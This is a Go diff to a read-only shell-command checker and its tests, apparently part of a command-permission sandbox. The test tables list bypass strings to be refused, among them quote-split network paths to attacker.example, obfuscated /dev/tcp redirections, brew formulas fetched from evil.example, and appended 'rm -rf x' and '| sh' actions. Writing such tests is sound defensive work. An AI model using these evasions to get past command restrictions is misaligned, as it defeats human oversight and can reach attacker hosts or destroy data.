@@ -178,6 +178,34 @@ var readOnlyBypasses = []struct{ name, cmd string }{
 	{"a printed network path through a variable", `Get-Date -Format "'//attacker.example/share/x'" -OutVariable p; Get-Content $p`},
 	{"a printed network path through a bracket", `Get-ChildItem (Get-Date -Format "'//attacker.example/share'")`},
 	{"a printed network path through a bracket, for sh's word", "wc -l $(git log -1 --format=%x2f%x2fattacker.example%x2fshare%x2fx)"},
+
+	// Round two, finishing pass. Each was seen here: the network reads on
+	// PowerShell 5.1 against \\localhost\c$ with Git for Windows' Unix tools on
+	// PATH, the connections under bash --posix, git's programs with GIT_TRACE.
+	// PowerShell ends an argument at the quote that began it: 'x'//h/s is x and
+	// //h/s, and sh's one argument x//h/s is no network path.
+	{"a quoted start splits off a network path, for a cmdlet", "Select-String 'x'//attacker.example/share/y"},
+	{"a quoted start splits off a network path, for Get-Content", "cat 'x'//attacker.example/share/y"},
+	{"a quoted start splits off a network path, for a program", "grep x 'a'//attacker.example/share/y"},
+	{"a double-quoted start splits off a network path", `grep x "a"//attacker.example/share/y`},
+	// A quote inside a quoted argument reaches a program unescaped, and the
+	// program's own parser drops it: /"/h/s is //h/s to head.exe.
+	{"a double quote inside single quotes hides a network path", `head -n 1 '/"/attacker.example/share/y'`},
+	{"a single quote inside double quotes hides a network path", `grep x "/'/attacker.example/share/y"`},
+	// Git for Windows' Unix tools read their arguments from @FILE.
+	{"a file of arguments", "head @list.txt"},
+	{"a file of arguments, quoted", "head '@list.txt'"},
+	// bash opens /dev/tcp/HOST/PORT after quote removal and expansion.
+	{"/dev/tcp behind quotes", "cat < /dev/t'c'p/127.0.0.1/9"},
+	{"/dev/tcp behind a backslash", `cat < /dev/tc\p/127.0.0.1/9`},
+	{"/dev/tcp behind an unset variable", "cat < /dev/tcp$x/127.0.0.1/9"},
+	{"/dev/tcp glued to <, double-quoted", `cat </dev/t"cp"/127.0.0.1/9`},
+	// git branch takes for-each-ref's fields: the signature ones run gpg, describe
+	// runs git describe, as a sort key as well as in a format.
+	{"git branch --sort=signature", "git branch --sort=signature"},
+	{"git branch --sort=-signature:grade", "git branch --sort=-signature:grade"},
+	{"git branch --sort=describe", "git branch --sort=describe"},
+	{"git describe --broken", "git describe --broken"},
 }
 
 // Forms ReadOnly refuses though no harm was shown for them: their effect
@@ -364,6 +392,32 @@ var readOnlyRefused = []struct{ name, cmd string }{
 	{"git remote show with a flag", "git remote show --frobnicate"},
 	{"git remote show a path", "git remote show ../other"},
 	{"brew with a substitution", "brew list $(echo x)"},
+
+	// Round two, finishing pass.
+	{"git branch --format with a signature field", "git branch --format=%(signature:grade)"},
+	{"git branch --format=signature text, even without brackets", "git branch --format=signature"},
+	{"git branch --sort=SIGNATURE, folded", "git branch --sort=SIGNATURE"},
+	{"git log %(describe)", "git log -1 --format=%(describe)"},
+	{"git describe --bro", "git describe --bro"},
+	{"-p is -PipelineVariable for Get-Date", "Get-Date -p v"},
+	{"-p is -PipelineVariable for echo", "echo hi -p v"},
+	{"-P: for Write-Output", "Write-Output hi -P:v"},
+	{"date -p, which is Get-Date where no date program is on PATH", `date -p C:\x`},
+	{"date -OutVariable", `date -OutVariable C:\x`},
+	{"brew info of a path", "brew info ./evil.rb"},
+	{"brew info of a .rb", "brew info evil.rb"},
+	{"brew info of a .json cask", "brew info --cask evil.JSON"},
+	{"brew info of a tap-qualified name", "brew info someone/tap/formula"},
+	{"brew info of a URL", "brew info https://evil.example/x.rb"},
+	{"brew deps --brewfile", "brew deps --brewfile"},
+	{"brew deps --for-each", "brew deps --for-each jq"},
+	{"brew info --eval-all", "brew info --eval-all --json=v2"},
+	{"a quote inside a quoted argument for a program", `grep "it's" notes.txt`},
+	{"a quoted argument ending in a backslash for a program", `grep 'a b\' notes.txt`},
+	{"PowerShell's --% for any word", "cat --% x"},
+	{"a splat for any word", "echo @args"},
+	{"two quoted pieces, which PowerShell keeps apart", `cat "x"'y'`},
+	{"a variable in what < opens", "wc -l < $HOME/x"},
 }
 
 // The plain forms must go on running without a prompt.
@@ -414,6 +468,14 @@ var readOnlyPlain = []string{
 	"which go", "pwd", "type ls", "basename /a/b", "dirname /a/b", "realpath .", "cut -d: -f1 /etc/passwd",
 	"tr a-z A-Z", "true", "egrep x f", "fgrep x f",
 	"cat r\u00e9sum\u00e9.txt", "ls \u6587\u4ef6", "cat cafe\u0301.txt",
+	// Round two, finishing pass: the nearest neighbours that only look. %G is no
+	// field of git branch (git: "unknown field name"); -p is ambiguous for
+	// Get-Process on 5.1; a bare start and a quoted rest stay one argument in
+	// both shells; a cmdlet takes a quote inside a quoted argument as text.
+	"git branch --sort=%G", "git branch --sort=v:refname", "git branch --sort=-objectsize", "git describe --tags --dirty",
+	"git log --no-show-signature -1", "ps -p 1", "Get-Process -Id 1", "cat 'notes.txt'", "grep 'x y' f",
+	"git log --format='%h %s' -n'3'", "cat < go.mod", "wc -l <go.mod", "echo 'a\"b'", "Select-String \"it's\" x",
+	"brew info python@3.12", "brew list --cask", "brew info --json=v2 jq libxml2",
 }
 
 func TestReadOnlyBypasses(t *testing.T) {
@@ -470,7 +532,8 @@ var (
 	roDateShows     = map[string]bool{"-u": true, "--utc": true, "--universal": true, "-R": true, "--rfc-email": true, "--rfc-2822": true, "--iso-8601": true, "-I": true, "-Idate": true, "-Ihours": true, "-Iminutes": true, "-Iseconds": true, "-Ins": true}
 	roHostnameShows = map[string]bool{"-f": true, "-s": true, "-i": true, "-I": true, "-A": true, "-d": true, "--fqdn": true, "--long": true, "--short": true, "--ip-address": true, "--all-ip-addresses": true, "--all-fqdns": true, "--domain": true}
 	roAppendedActs  = []string{"; rm -rf x", " | sh", " && sudo ls", "\nrm x", " > out", "; x=1", " | xargs rm", "; (Get-Item x).Delete()", " `id`", "; ./ls", "; env sh", "; $(echo rm x)", "; [IO.File]::Delete('x')", " | sort { rm x }", "\rrm x",
-		"  [DANGER: x]; rm -rf x", "; git status --help", "; cat //host/share/x", "; cat < /dev/tcp/host/80", "; HEAD x", "; sort -T . x", "; file -p x"}
+		"  [DANGER: x]; rm -rf x", "; git status --help", "; cat //host/share/x", "; cat < /dev/tcp/host/80", "; HEAD x", "; sort -T . x", "; file -p x",
+		"; cat 'x'//host/share/y", "; head '/\"/host/share/y'", "; cat < /dev/t'c'p/host/80", "; git branch --sort=signature", "; Get-Date -p v", "; head @x"}
 	roPrefixedActs = []string{"sudo ", "X=1 ", "exec ", "command ", "time ", "nohup ", "xargs ", "rm x; ", "$(echo sh) "}
 )
 
@@ -600,27 +663,47 @@ func readOnlyViolation(c string) string {
 						return word + " sets a variable: " + a
 					}
 				}
-				if p == "-ov" || p == "-ev" || p == "-wv" || p == "-iv" || p == "-pv" {
+				if p == "-ov" || p == "-ev" || p == "-wv" || p == "-iv" || p == "-pv" ||
+					(p == "-p" && (word == "get-date" || word == "write-output" || word == "echo")) {
 					return word + " sets a variable: " + a
 				}
 			}
 		}
-		strict := roStrictWords[word]
-		if strict {
-			// A quote of the other kind inside a quoted argument: PowerShell and
-			// a native program's parser do not agree about it.
-			quote := rune(0)
-			for _, r := range piece {
-				switch {
-				case quote == 0 && (r == '\'' || r == '"'):
-					quote = r
-				case r == quote:
-					quote = 0
-				case quote != 0 && (r == '\'' || r == '"'):
-					return word + " takes a quote inside a quoted argument"
-				}
+		for _, a := range given {
+			if strings.HasPrefix(a, "@") || a == "--%" {
+				return "PowerShell or a Unix tool of Git for Windows reads more into " + a
 			}
 		}
+		// A quote of the other kind inside a quoted argument: a program parsing
+		// the command line PowerShell builds sees other arguments (a cmdlet does
+		// not parse one). And a quote that begins an argument and is followed by
+		// text: PowerShell makes two arguments of it, sh one.
+		quote, prev := rune(0), ' '
+		quoteStarts := false
+		closed := false // the rune before this one closed a quote
+		for _, r := range piece {
+			if closed && quoteStarts && r != ' ' && r != '\t' {
+				return "PowerShell splits a quoted start from the text after it"
+			}
+			closed = false
+			switch {
+			case quote == 0 && (r == '\'' || r == '"'):
+				quote, quoteStarts = r, prev == ' ' || prev == '\t'
+			case r == quote:
+				quote, closed = 0, true
+			case quote != 0 && (r == '\'' || r == '"') && !roCmdlets[word]:
+				return word + " takes a quote inside a quoted argument"
+			}
+			prev = r
+		}
+		// What < opens, as sh opens it: quotes and backslashes removed.
+		if i := strings.LastIndex(piece, "<"); i >= 0 {
+			target := strings.Fields(strings.NewReplacer(`'`, "", `"`, "", `\`, "").Replace(piece[i+1:]) + " x")[0]
+			if strings.Contains(target, "$") || strings.Contains(target, "/dev/tcp/") || strings.Contains(target, "/dev/udp/") {
+				return "< opens a connection, or a name only expansion tells: " + target
+			}
+		}
+		strict := roStrictWords[word]
 		if !strict || strings.ContainsAny(piece, `'"\`) {
 			continue // strings.Fields reads a quoted or escaped argument wrongly
 		}
@@ -702,9 +785,15 @@ func readOnlyViolation(c string) string {
 				}
 			}
 		case "brew":
-			for _, a := range args {
-				if a == "--github" || a == "--fetch-HEAD" {
-					return "brew opens a browser or fetches: " + a
+			for _, a := range args[min(1, len(args)):] {
+				if roLong(a, "github") || roLong(a, "fetch-HEAD") || roLong(a, "brewfile") || roLong(a, "eval-all") || roLong(a, "for-each") {
+					return "brew opens a browser, fetches or evaluates Ruby: " + a
+				}
+				// A formula by its plain name: a path, a URL or a tap-qualified
+				// name makes brew load (and run) a .rb, or fetch.
+				l := strings.ToLower(a)
+				if !strings.HasPrefix(a, "-") && (strings.ContainsAny(a, `/\:`) || strings.HasSuffix(l, ".rb") || strings.HasSuffix(l, ".json")) {
+					return "brew loads a formula from a path or a tap: " + a
 				}
 			}
 		case "git":
@@ -718,8 +807,19 @@ func readOnlyViolation(c string) string {
 				if a == "--output" || strings.HasPrefix(a, "--output=") {
 					return "git writes a file: " + a
 				}
-				if a == "--help" || a == "--show-signature" || strings.Contains(a, "%G") {
+				if a == "--help" || a == "--show-signature" || roLong(a, "broken") {
 					return "git starts another program: " + a
+				}
+				// pretty-formats: %G… verifies a signature, %(describe) runs git
+				// describe. git branch takes for-each-ref's fields instead, where
+				// the signature ones and describe do the same and %G is nothing.
+				lower := strings.ToLower(a)
+				if args[0] != "branch" && (strings.Contains(a, "%G") || strings.Contains(lower, "%(describe")) {
+					return "git starts another program: " + a
+				}
+				if args[0] == "branch" && (strings.HasPrefix(a, "--format=") || strings.HasPrefix(a, "--sort=")) &&
+					(strings.Contains(lower, "signature") || strings.Contains(lower, "describe")) {
+					return "git branch starts another program: " + a
 				}
 				if args[0] == "branch" && roBranchActs[a] {
 					return "git branch acts: " + a
